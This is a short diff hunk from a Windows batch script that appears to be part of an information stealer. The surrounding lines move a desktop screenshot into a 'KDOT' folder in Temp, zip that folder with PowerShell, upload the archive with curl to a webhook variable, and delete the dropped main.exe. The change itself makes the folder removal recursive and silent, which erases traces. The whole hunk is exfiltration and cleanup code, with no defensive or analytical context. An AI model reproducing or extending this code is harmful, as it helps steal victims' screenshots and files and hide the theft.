@@ -76,5 +76,5 @@ move %localappdata%\Temp\desktop-screenshot.png %localappdata%\Temp\KDOT\desktop
 
 powershell -Command "Compress-Archive -Path %localappdata%\Temp\KDOT -DestinationPath %localappdata%\Temp\KDOT.zip" && curl -i -H 'Expect: application/json' -F file=@%userprofile%\AppData\Local\Temp\KDOT.zip %webhook%
 del %localappdata%\Temp\main.exe
-rmdir %localappdata%\Temp\KDOT
+rmdir /s /q %localappdata%\Temp\KDOT
 del KDOT.zip
